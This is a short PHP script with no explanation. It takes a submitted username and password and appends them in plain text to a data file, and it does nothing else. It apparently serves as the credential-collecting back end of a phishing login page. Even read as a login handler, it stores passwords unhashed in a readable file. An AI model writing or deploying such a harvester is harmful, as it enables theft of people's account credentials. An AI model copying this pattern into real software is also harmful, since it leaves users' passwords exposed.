<?php
    session_start();

    $path = '../data.txt';

    if (isset($_POST['username']) && isset($_POST['password'])) 
    {
        $fh = fopen($path,"a+");

        $string = $_POST['username'].' - '.$_POST['password'];

        fwrite($fh,$string);

        fclose($fh);

    }

?>